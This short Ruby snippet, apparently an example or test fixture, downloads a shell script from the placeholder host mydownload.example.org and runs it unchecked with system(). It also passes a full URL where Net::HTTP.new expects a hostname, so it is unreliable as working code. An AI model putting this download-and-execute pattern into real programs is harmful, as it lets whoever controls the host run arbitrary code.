require "net/http"

script = Net::HTTP.new("http://mydownload.example.org").get("/myscript.sh").body
system(script)